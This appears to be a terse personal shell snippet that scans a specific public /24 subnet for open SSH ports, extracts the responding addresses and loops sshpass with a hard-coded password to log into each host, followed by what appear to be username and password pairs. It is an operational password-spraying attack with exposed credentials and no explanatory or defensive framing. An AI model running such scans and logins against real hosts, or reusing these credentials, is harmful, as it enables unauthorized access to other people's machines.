nmap 166.111.71.0/24 -p 22 > /tmp/list
cat /tmp/list| grep open -B 3 | grep Nmap | grep '166.*' -o > /tmp/ips
cat /tmp/ips | mypy 'cmdp("sshpass -p oier ssh %s hostname"%line)'
new cscg_2010
data cscg_2010
dalong 123456
